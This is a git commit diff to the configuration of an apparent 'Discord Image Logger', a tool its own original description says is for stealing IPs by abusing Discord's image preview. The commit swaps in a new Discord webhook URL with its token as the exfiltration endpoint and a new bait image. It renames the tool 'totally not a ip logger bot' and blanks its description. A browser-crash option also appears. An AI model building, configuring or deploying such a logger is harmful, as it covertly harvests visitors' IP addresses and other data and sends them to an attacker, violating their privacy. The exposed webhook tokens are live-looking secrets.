d076a4749abb70b1ea32d8d484bf5d8009097ea7
CyanDiamond22 <cyandiamond22@gmail.com>
2026-08-16 15:22:25 -0500

    Update application name and webhook configuration

--- main.py
+++ main.py
@@ -5,21 +5,21 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "totally not a ip logger bot"
+__description__ = "????"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1538431177986146385/VdH8tnadTlfcEoAtUHGMLBgb3S8SDmekri5evTI4Axbb3VnKiZY9L-g7sdbnZ-Ssm28o",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTDUI0_1Dh2PlPaaHqrIaBFlSE6QT29DfKRz82F0-OCw&s=10", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "totally not a ip logger bot", # Set this to the name you want the webhook to have
+    "color": 0x3498DB, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
